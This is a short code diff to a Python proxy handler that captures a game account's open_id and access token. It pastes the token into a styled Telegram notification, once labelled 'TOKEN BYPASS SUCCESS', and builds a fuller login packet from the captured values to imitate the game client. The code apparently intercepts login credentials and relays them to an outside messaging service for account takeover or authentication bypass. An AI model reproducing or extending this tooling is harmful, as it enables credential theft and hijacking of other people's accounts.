@@ -94,7 +94,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
             # VIP Styled Telegram Notification
             message = f"""👑 <b>NIROB BBZ - SECURE PROXY SYSTEM</b> 👑
 ──────────────────────────────
-🔥 <b>STATUS:</b> <code>TOKEN BYPASS SUCCESS</code>
+🔥 <b>STATUS:</b> <code>LOGIN PACKET TRIGGERED</code>
 ──────────────────────────────
 🔑 <b>Access Token:</b>
 <code>{access_token}</code>
@@ -115,10 +115,13 @@ class ProxyHandler(BaseHTTPRequestHandler):
             except Exception:
                 pass
                 
-            # Safely formatted login payload structure
+            # Full structured schema for matching game client expectations
             login_payload = {
-                1: str(open_id),
-                2: str(access_token)
+                1: int(0),
+                2: str(open_id),
+                3: str(access_token),
+                4: str("BD"),
+                5: int(1)
             }
             
             try:
